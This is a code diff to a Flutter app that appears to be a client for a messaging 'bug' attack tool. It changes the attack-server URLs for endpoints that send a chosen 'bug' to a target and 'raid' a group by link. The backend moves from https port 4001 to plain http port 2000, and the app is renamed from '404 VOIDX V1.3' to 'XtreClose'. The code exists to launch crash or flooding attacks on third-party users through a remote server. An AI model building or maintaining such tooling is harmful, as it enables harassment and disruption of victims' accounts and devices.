@@ -168,7 +168,7 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
       // Step 4: Preparing
       await _updateProgress(3);
       
-      final url = "https://xterclose.zorryxhostz.my.id:4001/sendBug?key=${widget.sessionKey}&target=$target&bug=$selectedBugId&senderType=$_senderType";
+      final url = "http://xterclose.zorryxhostz.my.id:2000/sendBug?key=${widget.sessionKey}&target=$target&bug=$selectedBugId&senderType=$_senderType";
       
       // Step 5: Sending
       await _updateProgress(4);
@@ -245,7 +245,7 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
       await _updateProgress(3);
       
       final encodedLink = Uri.encodeComponent(link);
-      final url = "https://xterclose.zorryxhostz.my.id:4001/raidGroup?key=${widget.sessionKey}&link=$encodedLink&bug=$selectedBugId&senderType=$_senderType";
+      final url = "http://xterclose.zorryxhostz.my.id:2000/raidGroup?key=${widget.sessionKey}&link=$encodedLink&bug=$selectedBugId&senderType=$_senderType";
       
       // Step 5: Sending
       await _updateProgress(4);
@@ -589,7 +589,7 @@ class _HomePageState extends State<HomePage> with TickerProviderStateMixin {
                 crossAxisAlignment: CrossAxisAlignment.start,
                 children: [
                   const Text(
-                    "404 VOIDX V1.3",
+                    "XtreClose",
                     style: TextStyle(
                       color: Colors.white,
                       fontWeight: FontWeight.bold,
